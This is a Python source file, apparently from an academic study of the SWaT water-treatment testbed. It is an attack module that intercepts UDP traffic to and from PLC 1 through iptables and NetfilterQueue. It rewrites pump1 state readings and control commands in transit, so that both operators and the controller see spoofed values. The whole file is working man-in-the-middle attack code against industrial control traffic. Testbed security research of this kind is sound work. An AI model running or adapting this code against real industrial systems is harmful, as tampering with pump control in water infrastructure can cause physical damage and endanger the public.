#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# Copyright (c) 2015 David I. Urbina, david.urbina@utdallas.edu
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Secure Water Testbed (SWaT) Singapore University of Technology and Design.
SWATAttack module to control pump1 in PLC 1.
"""
from __future__ import print_function

import datetime
import os
import sys
from netfilterqueue import NetfilterQueue

from scapy.layers.inet import IP
from scapy.layers.inet import UDP

from swat.plc1 import SWAT_P1_RIO_DI, SWAT_P1_RIO_DO

# Parameters list
_pump1_in = True  # State: True is on, False is off
_pump1_out = True  # Control: True is on, False is off


def __inject(packet):
    pkt = IP(packet.get_payload())
    if SWAT_P1_RIO_DI in pkt:
        pkt[SWAT_P1_RIO_DI].pump1_run = 1 if _pump1_in else 0
        del pkt[UDP].chksum  # Need to recompute checksum
        packet.set_payload(str(pkt))

    if SWAT_P1_RIO_DO in pkt:
        if pkt[SWAT_P1_RIO_DO].number == 1:  # To avoid Multicast with same length
            pkt[SWAT_P1_RIO_DO].pump1_start = 1 if _pump1_out else 0
            del pkt[UDP].chksum  # Need to recompute checksum
            packet.set_payload(str(pkt))

    packet.accept()


def start():
    __setup()
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, __inject)
    try:
        print(datetime.datetime.now())
        print("[*] starting valve spoofing")
        nfqueue.run()
    except KeyboardInterrupt:
        __setdown()
        print("[*] stopping valve spoofing")
        nfqueue.unbind()
        print(datetime.datetime.now())
    return 1


def configure():
    global _pump1_in, _pump1_out
    valve = input('Set pump1 state On(1) or Off(0):')
    _pump1_in = True if valve else False
    valve = input('Set pump1 control On(1) or Off(0):')
    _pump1_out = True if valve else False
    params()


def params():
    state = 'On' if _pump1_in else 'Off'
    value = 1 if _pump1_in else 0
    print('Pump1 state : {} ({})'.format(state, value))
    state = 'On' if _pump1_out else 'Off'
    value = 1 if _pump1_out else 0
    print('Pump1 control : {} ({})'.format(state, value))


def __setup():
    os.system('sudo iptables -t mangle -A PREROUTING -p udp --dport 2222 -j NFQUEUE')


def __setdown():
    os.system('sudo iptables -t mangle -F')


if __name__ == '__main__':
    sys.exit(start())
